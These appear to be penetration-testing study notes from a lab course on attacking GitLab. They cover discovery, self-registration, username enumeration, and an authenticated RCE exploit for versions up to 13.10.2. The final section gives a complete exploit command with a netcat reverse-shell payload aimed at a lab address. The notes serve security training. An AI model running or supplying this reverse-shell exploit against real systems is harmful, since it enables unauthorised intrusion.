Gitlab is a web-based Git repo tools (similar to github), it often contains useful information that can be disclosed (like source code or even valid credentials)

Discovery:

The way to discover Gitlab is simple, we simply browse to that respective page and we would see gitlab, discovering version is a bit more tricky as the only way to get gitlab version is to get logged in and visit the /help page

Attacking Gitlab:

Sometimes, aside from gaining credentials from other place, Gitlab maybe configured in a way that anyone can simply create account and access public resources if such is possible, we can perform self service and start enumeration by browsing to /explore to see public projects available to us

User Enumeration:

Like WordPress, due to unique response when attempting to register for user, we can perform username enumeration and email enumeration, here an automated enumerator is available https://www.exploit-db.com/exploits/49821

Authenticated RCE:

All gitlab instance with version lower or equal to CE version 13.10.2 will suffer from this authenticated RCE, where we can use this exploit: https://www.exploit-db.com/exploits/49951, below is an example:
```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```